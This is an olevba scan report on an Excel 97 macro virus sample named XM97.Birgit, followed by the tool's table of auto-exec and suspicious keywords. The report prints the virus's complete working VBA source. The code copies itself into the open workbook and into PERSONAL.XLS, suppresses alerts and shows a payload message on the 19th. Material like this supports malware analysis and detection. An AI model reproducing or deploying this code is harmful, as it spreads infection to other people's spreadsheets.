olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Mvtk.c-3ed44e253d755723debe5be67a3144f9e93c70d7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DieseArbeitsmappe.cls 
in file: Virus.MSExcel.Mvtk.c-3ed44e253d755723debe5be67a3144f9e93c70d7 - OLE stream: '_VBA_PROJECT_CUR/VBA/DieseArbeitsmappe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle1.cls 
in file: Virus.MSExcel.Mvtk.c-3ed44e253d755723debe5be67a3144f9e93c70d7 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle2.cls 
in file: Virus.MSExcel.Mvtk.c-3ed44e253d755723debe5be67a3144f9e93c70d7 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle3.cls 
in file: Virus.MSExcel.Mvtk.c-3ed44e253d755723debe5be67a3144f9e93c70d7 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Birgit.bas 
in file: Virus.MSExcel.Mvtk.c-3ed44e253d755723debe5be67a3144f9e93c70d7 - OLE stream: '_VBA_PROJECT_CUR/VBA/Birgit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()

    ' -= [zWeiBLuM´s Macro Virii Terror Kit] =-
    ' -= [XM97.Birgit] =-

    ' -= [ID: 23971-Tx-7977996-Tp.X] =-

Application.OnSheetActivate = "SeL8789"
End Sub

Sub SeL8789()
On Error Resume Next
BpTlRn7566 = "Birgit"
GlHfNg8789 = "PERSONAL.XLS"
CfMwVq7977 = Application.StartupPath & "\" & GlHfNg8789
ClSqPi6209GlHfNg996 = 0
UfShJx8789BpTlRn7977 = 0
With Application
.StatusBar = "XM97.Birgit"
.ScreenUpdating = False
.DisplayAlerts = False
.EnableCancelKey = xlDisabled
End With
If Day(Now()) = 19 Then
MsgBox "Birgit or not?", vbOkOnly, "Birgit"
Assistant.Visible = True
With Assistant.NewBalloon
.Text = "Sniff... sniff... I'm ill...."
.Heading = "Sorry... infected by Birgit"
.Show
End With
Assistant.Visible = False
End If
Application.VBE.ActiveVBProject.VBComponents.Item(BpTlRn7566).Export "C:\WINDOWS\SYSTEM\Birgit.sys"
If Dir(CfMwVq7977) = GlHfNg8789 Then UfShJx8789BpTlRn7977 = 1
For x = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(x).Name = BpTlRn7566 Then ClSqPi6209GlHfNg996 = 1
Next x
If ClSqPi6209GlHfNg996 = 0 Then
ActiveWorkbook.VBProject.VBComponents.Import "C:\WINDOWS\SYSTEM\Birgit.sys"
ActiveWorkbook.Save
End If
If UfShJx8789BpTlRn7977 = 0 Then
Workbooks.Add.SaveAs FileName:=CfMwVq7977
ActiveWorkbook.VBProject.VBComponents.Import "C:\WINDOWS\SYSTEM\Birgit.sys"
ActiveWindow.Visible = False
Workbooks(GlHfNg8789).Save
End If
End Sub
Sub Auto_Close()
Application.OnSheetActivate = "SeL8789"
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

